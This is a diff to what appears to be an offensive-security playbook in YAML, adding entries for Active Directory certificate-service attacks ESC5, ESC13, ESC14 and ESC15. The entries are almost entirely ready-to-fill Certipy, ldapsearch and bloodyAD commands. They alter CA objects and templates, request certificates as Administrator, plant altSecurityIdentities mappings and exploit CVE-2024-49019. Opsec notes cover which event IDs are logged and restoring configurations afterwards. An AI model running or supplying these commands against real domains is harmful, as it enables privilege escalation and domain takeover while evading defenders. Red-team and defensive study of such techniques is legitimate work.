@@ -173,6 +173,81 @@ ESC11:
     - "Similar to ESC8 but uses RPC"
     - "RPC signing can block this attack"
 
+ESC5:
+  description: "Vulnerable PKI object ACLs - control CA or template objects"
+  commands:
+    - name: "If you control CA object - enable SAN flag"
+      tool: Certipy
+      command: |
+        certipy ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -enable-template 'SubCA' -dc-ip <DC_IP>
+    - name: "If you control template - modify to ESC1"
+      tool: Certipy
+      command: |
+        certipy template -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -save-old -dc-ip <DC_IP>
+    - name: "Then request certificate"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dc-ip <DC_IP>
+  opsec:
+    - "Object modification creates Event ID 5136"
+    - "CA configuration changes are logged"
+    - "Consider restoring original configuration"
+
+ESC13:
+  description: "Issuance Policy abuse - OID group link exploitation"
+  commands:
+    - name: "Find templates with issuance policies linking to groups"
+      tool: Certipy
+      command: |
+        certipy find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable
+    - name: "Request certificate with issuance policy"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -dc-ip <DC_IP>
+    - name: "Use certificate - may grant group membership"
+      tool: Certipy
+      command: |
+        certipy auth -pfx <USERNAME>.pfx -dc-ip <DC_IP>
+  opsec:
+    - "Issuance policy OIDs linked to AD groups"
+    - "Certificate grants effective group membership"
+    - "Relatively new attack (2023)"
+
+ESC14:
+  description: "Explicit mapping with altSecurityIdentities abuse"
+  commands:
+    - name: "Find users with weak altSecurityIdentities mappings"
+      tool: ldapsearch
+      command: |
+        ldapsearch -x -H ldap://<DC_IP> -D '<USERNAME>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=<DOMAIN_PART1>,DC=<DOMAIN_PART2>' '(altSecurityIdentities=*)' altSecurityIdentities
+    - name: "If you can modify altSecurityIdentities - add your cert"
+      tool: bloodyAD
+      command: |
+        bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set object <TARGET> altSecurityIdentities -v 'X509:<I>DC=<DOMAIN>,CN=<CA_NAME><S>CN=<YOUR_CERT_SUBJECT>'
+  opsec:
+    - "altSecurityIdentities modification creates Event ID 5136"
+    - "Explicit mapping bypasses normal certificate validation"
+
+ESC15:
+  description: "Application policy in EKU (CVE-2024-49019) - bypass EKU restrictions"
+  commands:
+    - name: "Find templates with Application Policies"
+      tool: Certipy
+      command: |
+        certipy find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable
+    - name: "Request certificate specifying client auth OID"
+      tool: Certipy
+      command: |
+        certipy req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -application-policies '1.3.6.1.5.5.7.3.2' -dc-ip <DC_IP>
+    - name: "Authenticate with certificate"
+      tool: Certipy
+      command: |
+        certipy auth -pfx <USERNAME>.pfx -dc-ip <DC_IP>
+  opsec:
+    - "CVE-2024-49019 - patched in November 2024"
+    - "Allows overriding EKU via Application Policies extension"
+    - "Check if target is patched before attempting"
+
 GoldenCert:
   description: "Steal CA private key - forge any certificate"
   commands:
